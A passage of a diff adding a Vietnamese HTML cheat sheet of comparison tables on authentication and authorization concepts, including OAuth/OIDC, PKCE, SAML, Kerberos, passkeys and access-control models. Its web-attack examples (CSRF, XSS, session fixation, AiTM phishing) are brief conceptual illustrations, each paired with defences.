+<tr><td>Ý nghĩa thật</td><td><b>Chưa xác thực</b> được (tên gọi “Unauthorized” dễ gây nhầm)</td><td>Đã biết bạn là ai, nhưng <b>không có quyền</b></td></tr>
+<tr><td>Nguyên nhân hay gặp</td><td>Thiếu token, token hết hạn, sai chữ ký, sai <code>aud</code></td><td>Thiếu scope/role, không phải chủ tài nguyên</td></tr>
+<tr><td>Kèm theo</td><td>Header <code>WWW-Authenticate</code></td><td>Không cần</td></tr>
+<tr><td>Client nên làm</td><td>Refresh token / đăng nhập lại</td><td>Đừng thử lại; báo không đủ quyền</td></tr>
+</tbody></table></div>
+<p><b>Ví dụ:</b> <code>GET /payroll</code> không có token → 401. Có token hợp lệ của An nhưng thiếu role <code>payroll-admin</code> → 403.</p>
+<span class="rule">401 = “bạn là ai?”; 403 = “biết bạn rồi, nhưng không được”.</span>
+<p>📚 <b>Học kỹ:</b> <a href="m06-2-api-authz.html#401-vs-403">Bài 6.2 — 401 vs 403 chi tiết</a></p>
+</div>
+
+<!-- ===================================================== -->
+<h2 id="oauth-oidc">4. OAuth / OIDC</h2>
+
+<div class="compare" id="oauth-vs-oidc"><span class="compare-title">OAuth 2.0 vs OpenID Connect</span>
+<div class="table-wrap"><table>
+<thead><tr><th>Tiêu chí</th><th>OAuth 2.0</th><th>OpenID Connect (OIDC)</th></tr></thead>
+<tbody>
+<tr><td>Giải quyết</td><td><b>Ủy quyền</b>: cho app gọi API thay người dùng</td><td><b>Đăng nhập</b>: cho app biết người dùng là ai</td></tr>
+<tr><td>Kết quả chính</td><td>Access token</td><td>ID token (+ access token)</td></tr>
+<tr><td>Quan hệ</td><td>Framework nền</td><td>Lớp xây <b>trên</b> OAuth 2.0</td></tr>
+<tr><td>Dấu hiệu nhận biết</td><td>Scope tùy API: <code>photos.read</code></td><td>Có scope <code>openid</code>, endpoint UserInfo, Discovery</td></tr>
+</tbody></table></div>
+<p><b>Ví dụ:</b> PrintNow chỉ cần đọc album của An trên PhotoCloud → OAuth (<code>scope=photos.read</code>). Nút “Đăng nhập bằng PhotoCloud” để PrintNow biết An là ai → cần OIDC (<code>scope=openid profile</code>) và kiểm ID token.</p>
+<span class="rule">OAuth trả lời “app được làm gì”; OIDC trả lời thêm “người dùng là ai”. Đừng dùng access token làm bằng chứng đăng nhập.</span>
+<p>📚 <b>Học kỹ:</b> <a href="m03-1-oauth-basics.html#authz-vs-authn">Bài 3.1 — Authorization framework, không phải giao thức đăng nhập</a> và <a href="m03-5-oidc.html#oidc-la-gi">Bài 3.5 — OIDC là gì?</a></p>
+</div>
+
+<div class="compare" id="public-vs-confidential"><span class="compare-title">Public client vs Confidential client</span>
+<div class="table-wrap"><table>
+<thead><tr><th>Tiêu chí</th><th>Public client</th><th>Confidential client</th></tr></thead>
+<tbody>
+<tr><td>Giữ được secret?</td><td><b>Không</b>: code chạy trên máy người dùng</td><td><b>Có</b>: code chạy trên server mình kiểm soát</td></tr>
+<tr><td>Ví dụ</td><td>SPA, app mobile, app desktop WPF</td><td>Web app server-side, BFF, <code>payroll-batch</code></td></tr>
+<tr><td>Xác thực với token endpoint</td><td>Không có secret; bắt buộc PKCE</td><td>Client secret, <code>private_key_jwt</code> hoặc mTLS (vẫn nên dùng PKCE)</td></tr>
+<tr><td>Grant dùng được</td><td>Authorization Code + PKCE, Device flow</td><td>Thêm Client Credentials</td></tr>
+</tbody></table></div>
+<p><b>Ví dụ:</b> Nhét <code>client_secret</code> vào bundle JavaScript của SPA là vô nghĩa — ai mở DevTools cũng thấy. Vì vậy SPA đăng ký là public client và dựa vào PKCE.</p>
+<span class="rule">Code chạy ở máy người dùng → public. Chạy ở server của bạn → confidential.</span>
+<p>📚 <b>Học kỹ:</b> <a href="m03-1-oauth-basics.html#client-types">Bài 3.1 — Public client vs Confidential client</a></p>
+</div>
+
+<div class="compare" id="front-vs-back-channel"><span class="compare-title">Front-channel vs Back-channel (và Authorization code vs Access token)</span>
+<div class="table-wrap"><table>
+<thead><tr><th>Tiêu chí</th><th>Front-channel</th><th>Back-channel</th></tr></thead>
+<tbody>
+<tr><td>Đường đi</td><td>Qua <b>trình duyệt</b> (redirect, URL, form POST)</td><td><b>Server gọi thẳng server</b>, trình duyệt không thấy</td></tr>
+<tr><td>Rủi ro</td><td>Lộ qua lịch sử, log, Referer, extension</td><td>Ít bị lộ hơn, có TLS + xác thực client</td></tr>
+<tr><td>Thứ đi qua</td><td><b>Authorization code</b>: dùng một lần, sống ~vài chục giây, tự nó không gọi được API</td><td><b>Access token</b> (+ refresh/ID token): dùng để gọi API</td></tr>
+<tr><td>Ví dụ khác</td><td>Front-channel logout (iframe)</td><td>Back-channel logout (POST <code>logout_token</code>)</td></tr>
+</tbody></table></div>
+<p><b>Ví dụ:</b> Keycloak redirect trình duyệt về <code>https://hr.kaopiz.com/signin-oidc?code=SplxlOB…&amp;state=…</code> (front-channel). Sau đó server <code>hr-web</code> POST code này + PKCE verifier tới token endpoint và nhận access token trong response (back-channel).</p>
+<span class="rule">Code là “phiếu đổi vé” đi qua đường công khai; vé thật (token) chỉ đi đường riêng.</span>
+<p>📚 <b>Học kỹ:</b> <a href="m03-2-auth-code-pkce.html#auth-code">Bài 3.2 — Authorization Code Flow</a> và <a href="m03-6-discovery-logout.html#front-back-channel">Bài 3.6 — Front-channel và back-channel logout</a></p>
+</div>
+
+<div class="compare" id="state-nonce-pkce"><span class="compare-title">state vs nonce vs PKCE</span>
+<div class="table-wrap"><table>
+<thead><tr><th>Tiêu chí</th><th><code>state</code></th><th><code>nonce</code></th><th>PKCE</th></tr></thead>
+<tbody>
+<tr><td>Chống</td><td>CSRF trên redirect (login CSRF)</td><td>Replay / tráo <b>ID token</b></td><td>Đánh cắp/tiêm <b>authorization code</b></td></tr>
+<tr><td>Nằm ở đâu</td><td>Gửi trong URL authorize, AS trả nguyên về redirect URI</td><td>Gửi trong URL authorize, xuất hiện lại trong claim <code>nonce</code> của ID token</td><td><code>code_challenge</code> ở authorize, <code>code_verifier</code> ở token request</td></tr>
+<tr><td>Ai kiểm</td><td>Client, khi nhận redirect</td><td>Client, khi validate ID token</td><td>Authorization server, khi đổi code</td></tr>
+<tr><td>Thuộc</td><td>OAuth 2.0</td><td>OIDC</td><td>RFC 7636 (bắt buộc trong OAuth 2.1)</td></tr>
+</tbody></table></div>
+<p><b>Ví dụ:</b> Kẻ tấn công lấy được <code>code</code> từ log proxy. Không có <code>code_verifier</code> (chỉ nằm trong bộ nhớ app của An), hắn không đổi được code thành token → PKCE chặn. Còn nếu hắn lừa trình duyệt An mở link callback chứa code của <b>chính hắn</b>, <code>state</code> không khớp → client từ chối.</p>
+<span class="rule">state bảo vệ <b>lượt redirect</b>, nonce bảo vệ <b>ID token</b>, PKCE bảo vệ <b>code</b>. Ba thứ bổ sung nhau, dùng đủ cả ba.</span>
+<p>📚 <b>Học kỹ:</b> <a href="m03-4-state-nonce-redirect.html#state-nonce">Bài 3.4 — PKCE, state, nonce</a> và <a href="m03-2-auth-code-pkce.html#pkce">PKCE chi tiết</a></p>
+</div>
+
+<div class="compare" id="grant-types"><span class="compare-title">Authorization Code (+PKCE) vs Client Credentials vs Device flow</span>
+<div class="table-wrap"><table>
+<thead><tr><th>Tiêu chí</th><th>Authorization Code + PKCE</th><th>Client Credentials</th><th>Device Authorization (RFC 8628)</th></tr></thead>
+<tbody>
+<tr><td>Có người dùng?</td><td>Có, đăng nhập qua trình duyệt</td><td><b>Không</b>: máy gọi máy</td><td>Có, nhưng đăng nhập trên <b>thiết bị khác</b></td></tr>
+<tr><td>Token đại diện cho</td><td>Người dùng (qua client)</td><td>Chính client</td><td>Người dùng</td></tr>
+<tr><td>Dùng khi</td><td>Web, SPA, mobile, desktop</td><td>Batch job, service-to-service</td><td>Smart TV, CLI, thiết bị không bàn phím</td></tr>
+<tr><td>Refresh token</td><td>Có thể có</td><td>Thường không cần (xin token mới)</td><td>Có thể có</td></tr>
+</tbody></table></div>
+<p><b>Ví dụ:</b> An đăng nhập <code>hr-web</code> → Authorization Code + PKCE. <code>payroll-batch</code> chạy 2 giờ sáng → Client Credentials. Ứng dụng PhotoCloud trên Smart TV hiện mã <code>WDJB-MJHT</code>, An mở điện thoại nhập mã → Device flow.</p>
+<span class="rule">Có người + có trình duyệt → Auth Code. Không có người → Client Credentials. Có người nhưng thiết bị không gõ được → Device flow.</span>
+<p>📚 <b>Học kỹ:</b> <a href="m03-2-auth-code-pkce.html#auth-code-pkce">Bài 3.2 — Auth Code + PKCE</a>, <a href="m03-3-other-grants.html#client-credentials">Client Credentials</a>, <a href="m03-3-other-grants.html#device-flow">Device flow</a></p>
+</div>
+
+<div class="compare" id="scope-claim-role"><span class="compare-title">Scope vs Claim vs Role</span>
+<div class="table-wrap"><table>
+<thead><tr><th>Tiêu chí</th><th>Scope</th><th>Claim</th><th>Role</th></tr></thead>
+<tbody>
+<tr><td>Là gì</td><td>Phạm vi quyền <b>client xin</b> và được cấp</td><td>Một <b>mẩu thông tin</b> (cặp khóa–giá trị) trong token</td><td>Nhóm quyền gán cho <b>người dùng</b></td></tr>
+<tr><td>Giới hạn ai</td><td>Ứng dụng (client)</td><td>— (chỉ là dữ liệu mang theo)</td><td>Người dùng</td></tr>
+<tr><td>Ví dụ</td><td><code>photos.read</code>, <code>hr.payroll.read</code></td><td><code>sub</code>, <code>email</code>, <code>exp</code>, <code>roles</code></td><td><code>payroll-admin</code>, <code>employee</code></td></tr>
+</tbody></table></div>
+<p><b>Ví dụ:</b> PrintNow được An cấp <code>photos.read</code> (scope) nên chỉ đọc được ảnh, dù An là <code>admin</code> trên PhotoCloud (role). Cả hai thông tin đều nằm trong token dưới dạng claim (<code>scope</code>, <code>roles</code>). API nên kiểm <b>cả hai</b>.</p>
+<span class="rule">Scope giới hạn <b>app</b>, role giới hạn <b>người</b>; claim là cái hộp chứa cả hai.</span>
+<p>📚 <b>Học kỹ:</b> <a href="m06-1-authz-models.html#building-blocks">Bài 6.1 — Permission, Role, Policy, Scope, Claim</a></p>
+</div>
+
+<!-- ===================================================== -->
+<h2 id="saml-enterprise">5. SAML &amp; enterprise</h2>
+
+<div class="compare" id="oidc-vs-saml"><span class="compare-title">OIDC vs SAML</span>
+<div class="table-wrap"><table>
+<thead><tr><th>Tiêu chí</th><th>OIDC</th><th>SAML 2.0</th></tr></thead>
+<tbody>
+<tr><td>Định dạng</td><td>JSON, JWT</td><td>XML, XML Signature</td></tr>
+<tr><td>Kết quả đăng nhập</td><td>ID token</td><td>SAML Assertion (trong Response)</td></tr>
+<tr><td>Gọi API</td><td>Có sẵn access token (OAuth)</td><td>Không có sẵn; chỉ lo đăng nhập web</td></tr>
+<tr><td>Hợp với</td><td>App mới, SPA, mobile, API</td><td>SSO doanh nghiệp, app SaaS/legacy đã hỗ trợ SAML</td></tr>
+</tbody></table></div>
+<p><b>Ví dụ:</b> Kaopiz xây app mobile mới gọi <code>hr-api</code> → OIDC. Kaopiz cần SSO vào một phần mềm kế toán chỉ hỗ trợ SAML → cấu hình Keycloak làm SAML IdP.</p>
+<span class="rule">Cùng giải bài toán SSO; OIDC là JSON và đi kèm OAuth cho API, SAML là XML và chỉ cho trình duyệt.</span>
+<p>📚 <b>Học kỹ:</b> <a href="m04-4-security.html#oidc-vs-saml">Bài 4.4 — So sánh OIDC và SAML</a></p>
+</div>
+
+<div class="compare" id="response-vs-assertion"><span class="compare-title">SAML Response vs SAML Assertion vs WebAuthn assertion</span>
+<div class="table-wrap"><table>
+<thead><tr><th>Tiêu chí</th><th>SAML Response</th><th>SAML Assertion</th><th>WebAuthn assertion</th></tr></thead>
+<tbody>
+<tr><td>Là gì</td><td><b>Phong bì</b> IdP gửi về SP</td><td><b>Giấy xác nhận</b> bên trong: ai, khi nào, cho SP nào, hết hạn khi nào</td><td>Kết quả <b>authenticator ký challenge</b> khi đăng nhập bằng passkey</td></tr>
+<tr><td>Ai tạo</td><td>IdP</td><td>IdP</td><td>Authenticator (điện thoại, khóa bảo mật)</td></tr>
+<tr><td>Chứa</td><td><code>Status</code>, <code>Destination</code>, <code>InResponseTo</code>, một hoặc nhiều Assertion</td><td><code>Subject/NameID</code>, <code>Conditions</code>, <code>AuthnStatement</code>, attributes</td><td><code>authenticatorData</code>, <code>clientDataJSON</code>, <code>signature</code></td></tr>
+<tr><td>Chữ ký</td><td>Có thể ký</td><td>Nên ký (SP phải kiểm đúng phần được ký)</td><td>Ký bằng private key của passkey</td></tr>
+</tbody></table></div>
+<p><b>Ví dụ:</b> SP nhận Response có chữ ký hợp lệ ở Response nhưng Assertion bên trong bị kẻ tấn công chèn thêm (XSW) — nếu code đọc nhầm Assertion chưa được ký, kẻ tấn công đăng nhập thành người khác. Còn “assertion” của WebAuthn không liên quan gì đến XML.</p>
+<span class="rule">Response = phong bì, Assertion = lá thư bên trong. “Assertion” trong WebAuthn chỉ là trùng tên.</span>
+<p>📚 <b>Học kỹ:</b> <a href="m04-2-assertion.html#response-vs-assertion">Bài 4.2 — Response vs Assertion</a> và <a href="m05-3-webauthn.html#webauthn-authentication">Bài 5.3 — WebAuthn Authentication</a></p>
+</div>
+
+<div class="compare" id="sp-vs-idp-initiated"><span class="compare-title">SP-initiated vs IdP-initiated SSO</span>
+<div class="table-wrap"><table>
+<thead><tr><th>Tiêu chí</th><th>SP-initiated</th><th>IdP-initiated</th></tr></thead>
+<tbody>
+<tr><td>Bắt đầu từ</td><td>Người dùng mở <b>ứng dụng</b> trước</td><td>Người dùng bấm icon trên <b>cổng IdP</b> trước</td></tr>
+<tr><td>Có AuthnRequest?</td><td>Có</td><td>Không</td></tr>
+<tr><td><code>InResponseTo</code></td><td>Có, SP đối chiếu được với request đã gửi</td><td>Không có → SP không biết mình có từng yêu cầu không</td></tr>
+<tr><td>Rủi ro</td><td>Thấp hơn</td><td>Dễ bị replay/tiêm assertion, login CSRF</td></tr>
+</tbody></table></div>
+<p><b>Ví dụ:</b> An gõ <code>hr.kaopiz.com</code> → bị chuyển tới Keycloak → quay về: SP-initiated. An mở trang “My Apps” của Entra ID rồi bấm icon HR: IdP-initiated.</p>
+<span class="rule">Ưu tiên SP-initiated: SP chỉ nhận câu trả lời cho câu hỏi mà chính nó đã hỏi.</span>
+<p>📚 <b>Học kỹ:</b> <a href="m04-3-flows-bindings.html#sp-initiated">Bài 4.3 — SP-initiated SSO</a> và <a href="m04-3-flows-bindings.html#idp-initiated-risks">Rủi ro của IdP-initiated</a></p>
+</div>
+
+<div class="compare" id="ldap-ad-entra"><span class="compare-title">LDAP vs Active Directory vs Microsoft Entra ID</span>
+<div class="table-wrap"><table>
+<thead><tr><th>Tiêu chí</th><th>LDAP</th><th>Active Directory (AD)</th><th>Microsoft Entra ID</th></tr></thead>
+<tbody>
+<tr><td>Là gì</td><td>Một <b>giao thức</b> truy vấn thư mục</td><td>Một <b>sản phẩm</b> thư mục on-premises của Microsoft</td><td>Dịch vụ <b>identity trên cloud</b> của Microsoft</td></tr>
+<tr><td>Giao thức chính</td><td>LDAP (389) / LDAPS (636)</td><td>LDAP, Kerberos, NTLM, DNS, Group Policy</td><td>OIDC, OAuth 2.0, SAML, Microsoft Graph</td></tr>
+<tr><td>Dùng cho</td><td>Đọc/ghi user, group trong mọi thư mục hỗ trợ</td><td>Đăng nhập domain Windows, mạng nội bộ</td><td>Đăng nhập app web/SaaS, Microsoft 365</td></tr>
+</tbody></table></div>
+<p><b>Ví dụ:</b> Một app cũ tìm group của An bằng LDAP query tới AD. Microsoft 365 của Kaopiz đăng nhập qua Entra ID, user được đồng bộ từ AD lên. Entra ID không cho app hỏi bằng LDAP như AD.</p>
+<span class="rule">LDAP là “ngôn ngữ”, AD là “tòa nhà on-prem nói ngôn ngữ đó”, Entra ID là “tòa nhà trên cloud nói OIDC/SAML”.</span>
+<p>📚 <b>Học kỹ:</b> <a href="m05-1-ldap-ad.html#ldap">Bài 5.1 — LDAP</a> và <a href="m05-1-ldap-ad.html#ad">Active Directory</a></p>
+</div>
+
+<div class="compare" id="kerberos-vs-ntlm"><span class="compare-title">Kerberos vs NTLM</span>
+<div class="table-wrap"><table>
+<thead><tr><th>Tiêu chí</th><th>Kerberos</th><th>NTLM</th></tr></thead>
+<tbody>
+<tr><td>Cơ chế</td><td><b>Ticket</b> do KDC (domain controller) cấp: TGT rồi service ticket</td><td>Challenge–response trực tiếp với server (server hỏi lại DC)</td></tr>
+<tr><td>Xác thực hai chiều</td><td>Có</td><td>Không</td></tr>
+<tr><td>Yêu cầu</td><td>Tên dịch vụ (SPN), DNS, đồng hồ lệch ít (mặc định ≤ 5 phút)</td><td>Ít điều kiện, nên hay là phương án dự phòng</td></tr>
+<tr><td>Rủi ro</td><td>Kerberoasting, golden ticket (nếu DC bị chiếm)</td><td>Pass-the-hash, NTLM relay; Microsoft đang loại bỏ dần</td></tr>
+</tbody></table></div>
+<p><b>Ví dụ:</b> An mở <code>http://intranet</code> bằng tên → Kerberos chạy êm. Mở bằng địa chỉ IP <code>http://10.0.0.5</code> → không có SPN khớp nên Windows thường rơi về NTLM.</p>
+<span class="rule">Kerberos = “vé do bên thứ ba tin cậy cấp”; NTLM = “đố – đáp” kiểu cũ, chỉ nên là dự phòng.</span>
+<p>📚 <b>Học kỹ:</b> <a href="m05-2-kerberos-enterprise.html#kerberos">Bài 5.2 — Kerberos</a> và <a href="m05-2-kerberos-enterprise.html#ntlm">NTLM</a></p>
+</div>
+
+<!-- ===================================================== -->
+<h2 id="passwordless-bao-mat">6. Passwordless &amp; bảo mật</h2>
+
+<div class="compare" id="fido2-webauthn-ctap-passkey"><span class="compare-title">FIDO2 vs WebAuthn vs CTAP vs Passkey</span>
+<div class="table-wrap"><table>
+<thead><tr><th>Tên</th><th>Là gì</th><th>Nói chuyện giữa</th></tr></thead>
+<tbody>
+<tr><td><b>FIDO2</b></td><td>Tên “bộ” chuẩn của FIDO Alliance, gồm WebAuthn + CTAP</td><td>—</td></tr>
+<tr><td><b>WebAuthn</b></td><td>API JavaScript chuẩn W3C (<code>navigator.credentials.create/get</code>)</td><td>Website (RP) ↔ trình duyệt</td></tr>
+<tr><td><b>CTAP</b></td><td>Giao thức tới authenticator rời qua USB/NFC/Bluetooth</td><td>Trình duyệt/OS ↔ authenticator</td></tr>
+<tr><td><b>Passkey</b></td><td>Tên thân thiện cho <b>FIDO credential</b> có thể dùng thay mật khẩu (discoverable)</td><td>Là thứ người dùng tạo và dùng</td></tr>
+</tbody></table></div>
+<p><b>Ví dụ:</b> <code>hr-web</code> gọi WebAuthn trong trình duyệt; trình duyệt dùng CTAP để nói chuyện với khóa YubiKey cắm USB; cái An tạo ra và dùng để đăng nhập là một passkey. Cả quy trình là FIDO2.</p>
+<span class="rule">FIDO2 = cả bộ; WebAuthn = phía web; CTAP = phía thiết bị; passkey = cái người dùng thấy.</span>
+<p>📚 <b>Học kỹ:</b> <a href="m05-3-webauthn.html#passwordless">Bài 5.3 — FIDO2, WebAuthn, CTAP, Passkeys</a></p>
+</div>
+
+<div class="compare" id="up-vs-uv"><span class="compare-title">User Presence (UP) vs User Verification (UV)</span>
+<div class="table-wrap"><table>
+<thead><tr><th>Tiêu chí</th><th>UP</th><th>UV</th></tr></thead>
+<tbody>
+<tr><td>Chứng minh</td><td>Có <b>một người</b> đang ở đó (chạm khóa)</td><td>Đúng là <b>chủ thiết bị</b> (PIN, vân tay, khuôn mặt)</td></tr>
+<tr><td>Cờ trong <code>authenticatorData</code></td><td>Bit UP</td><td>Bit UV</td></tr>
+<tr><td>Tương đương yếu tố</td><td>Chỉ “có” (possession)</td><td>“Có” + “biết”/“là” → đủ MFA trong một bước</td></tr>
+</tbody></table></div>
+<p><b>Ví dụ:</b> Chạm YubiKey không PIN → chỉ UP; ai nhặt được khóa cũng chạm được. Mở passkey bằng Face ID → UV. Nếu <code>hr-web</code> đặt <code>userVerification: "required"</code>, server phải kiểm bit UV = 1.</p>
+<span class="rule">UP = “có người”; UV = “đúng người”.</span>
+<p>📚 <b>Học kỹ:</b> <a href="m05-4-passkey.html#up-uv">Bài 5.4 — User Presence vs User Verification</a></p>
+</div>
+
+<div class="compare" id="synced-vs-device-bound"><span class="compare-title">Synced passkey vs Device-bound passkey</span>
+<div class="table-wrap"><table>
+<thead><tr><th>Tiêu chí</th><th>Synced</th><th>Device-bound</th></tr></thead>
+<tbody>
+<tr><td>Private key nằm ở</td><td>Được đồng bộ (mã hóa) qua iCloud Keychain, Google Password Manager…</td><td>Chỉ trong một thiết bị, không xuất ra được</td></tr>
+<tr><td>Mất thiết bị</td><td>Khôi phục được trên thiết bị mới</td><td>Mất luôn, cần credential dự phòng</td></tr>
+<tr><td>Mức đảm bảo</td><td>Phụ thuộc bảo mật tài khoản cloud</td><td>Cao hơn, hợp với admin, môi trường quy định chặt</td></tr>
+<tr><td>Ví dụ</td><td>Passkey trên iPhone tự có trên Mac</td><td>YubiKey, Windows Hello gắn TPM</td></tr>
+</tbody></table></div>
+<p><b>Ví dụ:</b> Nhân viên thường của Kaopiz dùng synced passkey cho tiện. Admin Keycloak bắt buộc dùng khóa phần cứng device-bound và đăng ký ít nhất 2 khóa.</p>
+<span class="rule">Synced: tiện, khôi phục dễ. Device-bound: chặt, nhưng phải có khóa dự phòng.</span>
+<p>📚 <b>Học kỹ:</b> <a href="m05-4-passkey.html#passkey">Bài 5.4 — Passkey: đồng bộ, gắn thiết bị, recovery</a></p>
+</div>
+
+<div class="compare" id="rbac-abac-acl-rebac"><span class="compare-title">RBAC vs ABAC vs ACL vs ReBAC</span>
+<div class="table-wrap"><table>
+<thead><tr><th>Mô hình</th><th>Quyết định dựa trên</th><th>Mạnh ở</th><th>Ví dụ</th></tr></thead>
+<tbody>
+<tr><td><b>RBAC</b></td><td>Role của người dùng</td><td>Đơn giản, dễ audit</td><td>Role <code>payroll-admin</code> được duyệt lương</td></tr>
+<tr><td><b>ABAC</b></td><td>Thuộc tính người dùng, tài nguyên, ngữ cảnh</td><td>Quy tắc chi tiết, linh hoạt</td><td>Chỉ HR phòng mình, trong giờ hành chính</td></tr>
+<tr><td><b>ACL</b></td><td>Danh sách quyền gắn trên từng tài nguyên</td><td>Chia sẻ từng đối tượng</td><td>Thư mục: An – đọc, Bình – sửa</td></tr>
+<tr><td><b>ReBAC</b></td><td>Quan hệ giữa người và tài nguyên (đồ thị)</td><td>Chia sẻ lồng nhau, tổ chức phân cấp</td><td>Quản lý trực tiếp của An được xem hồ sơ của An</td></tr>
+</tbody></table></div>
+<p><b>Ví dụ:</b> “Trưởng phòng được xem đơn nghỉ phép của <b>nhân viên mình quản lý</b>” — RBAC thuần không diễn tả được “của mình”; cần ABAC (so <code>department</code>) hoặc ReBAC (quan hệ <code>manager_of</code>). Thực tế thường kết hợp: RBAC làm khung, cộng thêm kiểm tra theo tài nguyên.</p>
+<span class="rule">RBAC hỏi “bạn là ai trong công ty”; ABAC hỏi “bạn và tài nguyên có đặc điểm gì”; ACL hỏi “tài nguyên này cho phép ai”; ReBAC hỏi “bạn có quan hệ gì với nó”.</span>
+<p>📚 <b>Học kỹ:</b> <a href="m06-1-authz-models.html#authz-compare">Bài 6.1 — Bảng so sánh RBAC, ABAC, ACL, ReBAC</a></p>
+</div>
+
+<div class="compare" id="csrf-vs-xss"><span class="compare-title">CSRF vs XSS</span>
+<div class="table-wrap"><table>
+<thead><tr><th>Tiêu chí</th><th>CSRF</th><th>XSS</th></tr></thead>
+<tbody>
+<tr><td>Kẻ tấn công làm gì</td><td>Lừa trình duyệt <b>gửi request</b> tới site của bạn, cookie tự đi kèm</td><td><b>Chạy JavaScript</b> của hắn ngay trong trang của bạn</td></tr>
+<tr><td>Đọc được response?</td><td>Không, chỉ “bắn mù”</td><td>Có, làm được mọi thứ người dùng làm</td></tr>
+<tr><td>Điều kiện</td><td>Xác thực tự động bằng cookie</td><td>Trang chèn dữ liệu chưa escape</td></tr>
+<tr><td>Phòng thủ</td><td>Cookie <code>SameSite</code>, anti-forgery token, kiểm Origin</td><td>Output encoding, CSP, không dùng <code>innerHTML</code> với dữ liệu người dùng</td></tr>
+</tbody></table></div>
+<p><b>Ví dụ:</b> CSRF: trang <code>evil.com</code> có form tự POST tới <code>hr.kaopiz.com/bank-account</code> để đổi số tài khoản nhận lương của An. XSS: ô “ghi chú” trong <code>hr-web</code> lưu <code>&lt;script&gt;</code>, ai mở trang cũng bị chạy script.</p>
+<span class="rule">CSRF mượn <b>tay</b> trình duyệt; XSS chiếm <b>cả trang</b>. Có XSS thì chống CSRF cũng không cứu được.</span>
+<p>📚 <b>Học kỹ:</b> <a href="m06-3-web-threats.html#csrf">Bài 6.3 — CSRF</a> và <a href="m06-3-web-threats.html#xss">XSS</a></p>
+</div>
+
+<div class="compare" id="fixation-vs-hijacking"><span class="compare-title">Session fixation vs Session hijacking</span>
+<div class="table-wrap"><table>
+<thead><tr><th>Tiêu chí</th><th>Session fixation</th><th>Session hijacking</th></tr></thead>
+<tbody>
+<tr><td>Thời điểm</td><td>Kẻ tấn công <b>cài sẵn</b> session ID <b>trước</b> khi nạn nhân đăng nhập</td><td>Kẻ tấn công <b>lấy trộm</b> session ID <b>sau</b> khi nạn nhân đăng nhập</td></tr>
+<tr><td>Cách làm</td><td>Gửi link/cookie có session ID biết trước</td><td>XSS, malware, AiTM, sniff mạng không TLS</td></tr>
+<tr><td>Phòng thủ chính</td><td><b>Cấp session ID mới</b> ngay sau đăng nhập</td><td>Cookie <code>HttpOnly</code>, <code>Secure</code>, timeout ngắn, chống XSS</td></tr>
+</tbody></table></div>
+<p><b>Ví dụ:</b> Nếu <code>hr-web</code> giữ nguyên session ID từ trước khi An đăng nhập, kẻ đã “cài” ID đó cho An sẽ dùng chung phiên đăng nhập với An (fixation). Nếu kẻ tấn công đọc được cookie qua XSS thì đó là hijacking.</p>
+<span class="rule">Fixation = “đưa chìa cho nạn nhân rồi chờ”; hijacking = “trộm chìa của nạn nhân”.</span>
+<p>📚 <b>Học kỹ:</b> <a href="m06-3-web-threats.html#session-fixation">Bài 6.3 — Session fixation</a> và <a href="m02-2-session-cookie.html#session-fixation">Bài 2.2 — Session fixation</a></p>
+</div>
+
+<div class="compare" id="phishing-aitm-fatigue"><span class="compare-title">Phishing thường vs AiTM phishing vs MFA fatigue</span>
+<div class="table-wrap"><table>
+<thead><tr><th>Tiêu chí</th><th>Phishing thường</th><th>AiTM phishing</th><th>MFA fatigue</th></tr></thead>
+<tbody>
+<tr><td>Lấy được gì</td><td>Mật khẩu (và OTP nếu dùng ngay)</td><td><b>Session cookie</b> sau khi đăng nhập xong</td><td>Một lần bấm “Chấp nhận” push</td></tr>
+<tr><td>Cách làm</td><td>Trang giả tĩnh thu thập form</td><td>Proxy chuyển tiếp tới trang thật</td><td>Đã có mật khẩu, spam push liên tục</td></tr>
+<tr><td>Vượt được</td><td>Chỉ mật khẩu (OTP nếu nhanh tay)</td><td>Mật khẩu + OTP + push</td><td>Push không có number matching</td></tr>
+<tr><td>Chặn bằng</td><td>MFA, đào tạo</td><td>Passkey/FIDO2 (gắn với domain), Conditional Access</td><td>Number matching, giới hạn số lần, passkey</td></tr>
+</tbody></table></div>
+<p><b>Ví dụ:</b> An nhận email dẫn tới <code>kaopiz-login.com</code>. Trang này proxy Keycloak thật: An nhập đủ mật khẩu và OTP, kẻ tấn công nhận cookie phiên → AiTM. Nếu An dùng passkey, trình duyệt từ chối vì domain không khớp RP ID.</p>
+<span class="rule">Phishing thường trộm <b>mật khẩu</b>, AiTM trộm <b>phiên</b>, MFA fatigue trộm <b>sự mệt mỏi</b> của bạn. Passkey chặn cả hai loại đầu.</span>
+<p>📚 <b>Học kỹ:</b> <a href="m06-4-identity-attacks.html#aitm">Bài 6.4 — AiTM phishing</a> và <a href="m06-4-identity-attacks.html#mfa-fatigue">MFA fatigue</a></p>
+</div>
+
+<!-- ===================================================== -->
+<h2 id="kien-truc">7. Kiến trúc</h2>
+
+<div class="compare" id="spa-bff-server"><span class="compare-title">SPA vs BFF vs Server-side web</span>
+<div class="table-wrap"><table>
+<thead><tr><th>Tiêu chí</th><th>SPA thuần</th><th>SPA + BFF</th><th>Server-side web</th></tr></thead>
+<tbody>
+<tr><td>Loại client</td><td>Public</td><td>Confidential (BFF giữ secret)</td><td>Confidential</td></tr>
+<tr><td>Token nằm ở</td><td><b>Trình duyệt</b></td><td><b>Server BFF</b>; trình duyệt chỉ có cookie session</td><td>Server</td></tr>
+<tr><td>Rủi ro chính</td><td>XSS lấy/dùng token</td><td>CSRF (chặn bằng SameSite + anti-forgery)</td><td>CSRF, session</td></tr>
+<tr><td>Hợp với</td><td>App nhỏ, ít nhạy cảm</td><td>SPA có dữ liệu nhạy cảm (khuyến nghị)</td><td>Razor/MVC truyền thống</td></tr>
+</tbody></table></div>
+<p><b>Ví dụ:</b> Trang lương React của Kaopiz: thay vì để access token cho <code>hr-api</code> nằm trong JavaScript, một BFF ASP.NET Core đăng nhập OIDC, giữ token, và proxy mọi request <code>/api/*</code> kèm Bearer. React chỉ thấy cookie <code>HttpOnly</code>.</p>
+<span class="rule">Càng ít token trong trình duyệt càng tốt — BFF đưa token về lại server.</span>
+<p>📚 <b>Học kỹ:</b> <a href="m07-1-design-web.html#spa">Bài 7.1 — SPA</a>, <a href="m07-1-design-web.html#bff">BFF</a>, <a href="m07-1-design-web.html#server-web">Server-side web</a></p>
+</div>
+
+<div class="compare" id="browser-vs-webview"><span class="compare-title">System browser vs Embedded webview (app native)</span>
+<div class="table-wrap"><table>
+<thead><tr><th>Tiêu chí</th><th>System browser</th><th>Embedded webview</th></tr></thead>
+<tbody>
